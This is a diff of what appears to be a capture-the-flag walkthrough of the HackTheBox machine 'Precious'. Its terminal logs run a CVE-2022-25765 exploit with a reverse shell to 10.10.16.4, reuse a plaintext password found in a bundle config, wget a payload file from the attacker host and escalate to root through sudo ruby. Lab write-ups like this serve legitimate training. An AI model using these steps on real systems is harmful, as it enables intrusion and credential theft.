@@ -75,7 +75,6 @@ CVE-2022-25765.py                                          100%[================
 
 2025-07-02 08:53:49 (38.4 MB/s) - ‘CVE-2022-25765.py’ saved [1582/1582]
 
-
 └─$ python3.13 CVE-2022-25765.py -t http://precious.htb -a 10.10.16.4 -p 4444
 [*] Input target address is http://precious.htb
 [*] Input address for reverse connect is 10.10.16.4
@@ -94,7 +93,6 @@ ruby@precious:/var/www/pdfapp$ id
 id
 uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
 
-
 ruby@precious:/var/www/pdfapp$ cat /home/henry/user.txt
 cat /home/henry/user.txt
 cat: /home/henry/user.txt: Permission denied
@@ -110,19 +108,15 @@ cat /home/ruby/.bundle/config
 ---
 BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
 
-
 ruby@precious:/var/www/pdfapp$ su henry
 su henry
 Password: Q3c1AqGHtoI0aXAYFH
 
-
 id
 uid=1000(henry) gid=1000(henry) groups=1000(henry)
 
-
 SHELL=/bin/bash script -q /dev/null
 henry@precious:/var/www/pdfapp$
-
 
 henry@precious:/var/www/pdfapp$ cat /home/henry/user.txt
 cat /home/henry/user.txt
@@ -211,7 +205,6 @@ dependencies.ymlダウンロードし、実行
 henry@precious:~$ cd /home/henry
 cd /home/henry
 
-
 henry@precious:~$ wget http://10.10.16.4/dependencies.yml
 wget http://10.10.16.4/dependencies.yml
 --2025-07-02 10:08:12--  http://10.10.16.4/dependencies.yml
@@ -223,7 +216,6 @@ Saving to: ‘dependencies.yml’
      0K                                                       100%  119M=0s
 
 2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]
-
 
 henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
 sudo /usr/bin/ruby /opt/update_dependencies.rb
@@ -272,7 +264,6 @@ connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 50478
 root@precious:/home/henry# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-
 
 root@precious:/home/henry# cat /root/root.txt
 cat /root/root.txt
